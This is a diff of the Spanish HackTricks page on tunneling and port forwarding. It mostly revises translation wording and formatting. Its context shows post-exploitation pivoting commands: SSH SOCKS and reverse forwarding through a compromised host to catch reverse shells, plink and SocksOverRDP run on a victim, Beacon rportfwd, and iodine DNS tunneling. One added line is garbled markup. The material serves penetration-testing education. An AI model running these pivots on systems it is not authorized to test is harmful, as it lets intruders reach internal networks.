@@ -1,15 +1,15 @@
 # Tunneling and Port Forwarding
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -18,7 +18,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 ## Nmap tip
 
 {% hint style="warning" %}
-**ICMP** y **SYN** scans no pueden ser tunelizados a través de proxies socks, así que debemos **deshabilitar el descubrimiento de ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que esto funcione.
+**Los escaneos ICMP** y **SYN** no se pueden tunelizar a través de proxies socks, por lo que debemos **desactivar el descubrimiento de ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que esto funcione.
 {% endhint %}
 
 ## **Bash**
@@ -69,9 +69,9 @@ Puerto local --> Host comprometido (SSH) --> Donde sea
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Reverse Port Forwarding
+### Reenvío de Puertos Inverso
 
-Esto es útil para obtener shells reversos de hosts internos a través de una DMZ a tu host:
+Esto es útil para obtener shells inversos de hosts internos a través de una DMZ a tu host:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -167,9 +167,9 @@ rportfwd stop [bind port]
 ```
 Para tener en cuenta:
 
-- El reenvío de puerto inverso de Beacon está diseñado para **túnel tráfico al Servidor del Equipo, no para retransmitir entre máquinas individuales**.
-- El tráfico es **tuneado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
-- **No se requieren privilegios de administrador** para crear reenvíos de puerto inverso en puertos altos.
+* La **reversa de puerto de Beacon** está diseñada para **túnelizar el tráfico hacia el Servidor del Equipo, no para retransmitir entre máquinas individuales**.
+* El tráfico está **túnelizado dentro del tráfico C2 de Beacon**, incluyendo enlaces P2P.
+* **No se requieren privilegios de administrador** para crear reenvíos de puerto reversos en puertos altos.
 
 ### rPort2Port local
 
@@ -211,7 +211,7 @@ Necesitas usar la **misma versión para el cliente y el servidor**
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**Usa la misma versión para el agente y el proxy**
+**Utiliza la misma versión para el agente y el proxy**
 
 ### Tunneling
 ```bash
@@ -332,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).
 
-Como este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para poder tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
+Como este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio y puerto ssh para que podamos tener una conexión inversa. Luego, para redirigir solo un puerto accesible localmente a un puerto en nuestra máquina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -364,7 +364,7 @@ En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** así:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Ahora podemos **conectar** con la **víctima** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** diciendo que el **plugin SocksOverRDP está habilitado**, y estará **escuchando** en **127.0.0.1:1080**.
+Ahora podemos **conectar** con la **víctima** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **mensaje** diciendo que el **plugin SocksOverRDP está habilitado**, y escuchará en **127.0.0.1:1080**.
 
 **Conéctese** a través de **RDP** y suba y ejecute en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
 ```
@@ -415,7 +415,7 @@ Un proxy inverso creado por Microsoft. Puedes encontrarlo aquí: [https://github
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Se necesita root en ambos sistemas para crear adaptadores tun y túnelar datos entre ellos utilizando consultas DNS.
+Se necesita root en ambos sistemas para crear adaptadores tun y túnel datos entre ellos utilizando consultas DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -489,13 +489,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) es una herramienta para exponer soluciones a Internet en una línea de comando.**
-*Las URI de exposición son como:* **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **es una herramienta para exponer soluciones a Internet en una línea de comando.**\
+&#xNAN;_&#x45;xposition URI son como:_ **UID.ngrok.io**
 
 ### Instalación
 
-- Crea una cuenta: https://ngrok.com/signup
-- Descarga del cliente:
+* Crea una cuenta: https://ngrok.com/signup
+* Descarga del cliente:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -506,7 +506,7 @@ chmod a+x ./ngrok
 
 **Documentación:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*También es posible agregar autenticación y TLS, si es necesario.*
+_También es posible agregar autenticación y TLS, si es necesario._
 
 #### Túnel TCP
 ```bash
@@ -523,7 +523,7 @@ chmod a+x ./ngrok
 ```
 #### Sniffing HTTP calls
 
-*Útil para XSS, SSRF, SSTI ...*
+_Uso útil para XSS, SSRF, SSTI ..._\
 Directamente desde stdout o en la interfaz HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling internal HTTP service
@@ -536,8 +536,9 @@ Directamente desde stdout o en la interfaz HTTP [http://127.0.0.1:4040](http://1
 #### ngrok.yaml ejemplo de configuración simple
 
 Abre 3 túneles:
-- 2 TCP
-- 1 HTTP con exposición de archivos estáticos desde /tmp/httpbin/
+
+* 2 TCP
+* 1 HTTP con exposición de archivos estáticos desde /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -556,15 +557,15 @@ addr: file:///tmp/httpbin/
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 {% hint style="success" %}
-Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Apoya a HackTricks</summary>
 
 * Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
